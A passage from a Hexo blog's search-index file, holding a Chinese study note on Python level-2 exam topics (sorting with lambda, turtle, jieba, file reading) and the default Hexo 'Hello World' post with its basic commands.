src="/2023/03/25/python%E4%BA%8C%E7%BA%A7%E9%80%9F%E9%80%9A/image-20230325135123564.png" alt="image-20230325135123564"></p><p>lambda:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">L=[(<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-number">2</span>),(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1</span>),(<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-number">3</span>),(<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-number">4</span>)]<br><span class="hljs-comment">#2、利用参数 cmp 排序</span><br><span class="hljs-built_in">sorted</span>(L, cmp=<span class="hljs-keyword">lambda</span> x,y:cmp(x[<span class="hljs-number">1</span>],y[<span class="hljs-number">1</span>]))<br> 结果：<br>[(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">1</span>), (<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-number">2</span>), (<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-number">3</span>), (<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-number">4</span>)]<br><span class="hljs-comment">#3、利用参数 key 排序</span><br><span class="hljs-built_in">sorted</span>(L, key=<span class="hljs-keyword">lambda</span> x:x[<span class="hljs-number">1</span>])<br><span class="hljs-comment">#结果：</span><br>[(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">1</span>), (<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-number">2</span>), (<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-number">3</span>), (<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-number">4</span>)]<br><span class="hljs-comment">#4、按年龄升序</span><br>students = [(<span class="hljs-string">&#x27;john&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">15</span>), (<span class="hljs-string">&#x27;jane&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-number">12</span>), (<span class="hljs-string">&#x27;dave&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-number">10</span>)]<br><span class="hljs-built_in">sorted</span>(students, key=<span class="hljs-keyword">lambda</span> s: s[<span class="hljs-number">2</span>])<br> 结果：<br>[(<span class="hljs-string">&#x27;dave&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-number">10</span>), (<span class="hljs-string">&#x27;jane&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-number">12</span>), (<span class="hljs-string">&#x27;john&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">15</span>)]<br><span class="hljs-comment">#5、按年龄降序</span><br><span class="hljs-built_in">sorted</span>(students, key=<span class="hljs-keyword">lambda</span> s: s[<span class="hljs-number">2</span>], reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-comment">#结果：</span><br>[(<span class="hljs-string">&#x27;john&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">15</span>), (<span class="hljs-string">&#x27;jane&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-number">12</span>), (<span class="hljs-string">&#x27;dave&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-number">10</span>)]<br><br></code></pre></td></tr></table></figure><h2 id="计数排序问题"><a href="#计数排序问题" class="headerlink" title="计数排序问题"></a>计数排序问题</h2><p><img src="/2023/03/25/python%E4%BA%8C%E7%BA%A7%E9%80%9F%E9%80%9A/image-20230325135128947.png" alt="image-20230325135128947"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"> D[vote[:-<span class="hljs-number">1</span>]]=D.get(vote[:-<span class="hljs-number">1</span>],<span class="hljs-number">0</span>)+<span class="hljs-number">1</span><br>        NUM+=<span class="hljs-number">1</span><br>l = <span class="hljs-built_in">list</span>(D.items())<br>l.sort(key=<span class="hljs-keyword">lambda</span> s:s[<span class="hljs-number">1</span>],reverse=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p>例题4：</p><p><img src="/2023/03/25/python%E4%BA%8C%E7%BA%A7%E9%80%9F%E9%80%9A/image-20230325135134747.png" alt="image-20230325135134747"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">img = [<span class="hljs-number">0.244</span>, <span class="hljs-number">0.832</span>, <span class="hljs-number">0.903</span>, <span class="hljs-number">0.145</span>, <span class="hljs-number">0.26</span>, <span class="hljs-number">0.452</span>]<br><span class="hljs-built_in">filter</span> = [<span class="hljs-number">0.1</span>,<span class="hljs-number">0.8</span>,<span class="hljs-number">0.1</span>]<br>res = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(img)-<span class="hljs-number">2</span>):<br>    k=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        k += <span class="hljs-built_in">filter</span>[j]*img[i+j]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;k=&#123;:.3f&#125;,filter[&#123;&#125;]=&#123;:.3f&#125;,img[&#123;&#125;+&#123;&#125;]=&#123;:.3f&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(k,j,<span class="hljs-built_in">filter</span>[j],i,j,img[i+j]))<br>    res.append(k)<br><span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> res:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;:&lt;10.3f&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(r),end = <span class="hljs-string">&#x27;&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>开始半天没看懂这纱暖题目什么吊意思，大概就是说，要算四个向量内积，从lt1的第一个元素开始，然后还要把计算过程打印出来。挺nt的就是说。专门标注一下。</p><h2 id="turtle库"><a href="#turtle库" class="headerlink" title="turtle库"></a>turtle库</h2><p>常用方法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">turtle.fd(&lt;前进多少个单位&gt;)<span class="hljs-comment">#前进</span><br>turtle.seth()<span class="hljs-comment">#调整方向</span><br><span class="hljs-comment">#seth(90)就是从逆时针调整九十度，seth(-90)就是顺时针</span><br><span class="hljs-comment">#相当于以当前位置为原点画一个坐标轴</span><br>turtle.penup()<span class="hljs-comment">#提起笔:动时不会有痕迹</span><br>turtle.pendown()<span class="hljs-comment">#落笔:移动时候开始有痕迹</span><br>turtle.pencolor()<span class="hljs-comment">#调整画笔颜色</span><br>turtle.circle()<span class="hljs-comment">#画圆，参数是半径</span><br></code></pre></td></tr></table></figure><h2 id="jieba库"><a href="#jieba库" class="headerlink" title="jieba库"></a>jieba库</h2><p>常用的就一条：</p><p><code>s.lcut(str)</code></p><p>用来将一个字符串里分词，返回的数据是一个列表</p><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作:"></a>文件操作:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;文件名&#x27;</span>，<span class="hljs-string">&#x27;打开模式&#x27;</span>)<span class="hljs-comment">#r模式是读，w模式是写</span><br><span class="hljs-comment">#这个时候f作为对象名字，调用方法时用f.方法名(参数)</span><br>f.read()<br><span class="hljs-comment">#读取文件内容，返回字符串，如果是b模式（二进制模式）打开，就是二进制数据内容，一般打开图片的时候采用b模式,二级题目里基本都是读取文本内容然后处理</span><br>f.readlines()<span class="hljs-comment">#按行读取，返回的是一个列表，每一行对应列表里一个元素</span><br>f.readline()<span class="hljs-comment">#只读取一行</span><br>f.write()<span class="hljs-comment">#写入内容</span><br></code></pre></td></tr></table></figure><p>一般文件操作都会配合for循环使用，因为大部分的题目都是让你在文本里筛选出符合条件的内容，一般流程如下：</p><ol><li>打开文件后读取所有行<code>readlines</code></li><li>然后<code>for ... in ...:</code>去遍历每一行的内容</li><li>再用if语句判断具体条件</li><li>然后执行下一步操作，计数或者写入</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/03/25/hello-world/"/>
    <url>/2023/03/25/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
